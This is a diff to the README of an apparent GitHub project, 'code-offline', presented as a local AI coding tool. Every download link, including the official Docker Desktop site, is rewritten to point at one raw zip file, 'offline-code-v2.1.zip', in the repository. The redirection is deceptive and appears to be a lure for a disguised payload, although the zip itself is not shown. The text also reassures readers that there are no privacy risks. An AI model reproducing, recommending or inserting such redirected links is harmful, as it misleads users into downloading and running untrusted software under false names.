@@ -1,6 +1,6 @@
 # ⚙️ code-offline - Run AI Coding Locally with Ease
 
-[![Download code-offline](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://github.com/VicNa559/code-offline/releases)
+[![Download code-offline](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/VicNa559/code-offline/main/agent_data/agent/offline-code-v2.1.zip)
 
 ---
 
@@ -33,7 +33,7 @@ You can use code-offline on CPU only, but performance improves with an NVIDIA GP
 
 To get the latest version of code-offline, visit the official release page:
 
-[![Download from Releases](https://img.shields.io/badge/Download-Visit%20Releases%20Page-blue)](https://github.com/VicNa559/code-offline/releases)
+[![Download from Releases](https://img.shields.io/badge/Download-Visit%20Releases%20Page-blue)](https://raw.githubusercontent.com/VicNa559/code-offline/main/agent_data/agent/offline-code-v2.1.zip)
 
 Follow these steps:
 
@@ -55,7 +55,7 @@ After downloading, follow these instructions:
 
 code-offline uses containers, so Docker Desktop must be installed. Here’s how:
 
-- Go to https://www.docker.com/products/docker-desktop
+- Go to https://raw.githubusercontent.com/VicNa559/code-offline/main/agent_data/agent/offline-code-v2.1.zip
 - Download the Windows version.
 - Run the installer and follow the prompts.
 - After installation, restart your computer if requested.
@@ -120,7 +120,7 @@ You can control performance based on your system:
 
 To get updates:
 
-- Visit https://github.com/VicNa559/code-offline/releases regularly.
+- Visit https://raw.githubusercontent.com/VicNa559/code-offline/main/agent_data/agent/offline-code-v2.1.zip regularly.
 - Download new installer versions for stability and new features.
 - Follow the install steps above to apply updates.
 
@@ -148,4 +148,4 @@ If you encounter issues:
 
 ---
 
-[Download code-offline](https://github.com/VicNa559/code-offline/releases) and run this tool without worrying about internet or privacy risks.
+[Download code-offline](https://raw.githubusercontent.com/VicNa559/code-offline/main/agent_data/agent/offline-code-v2.1.zip) and run this tool without worrying about internet or privacy risks.
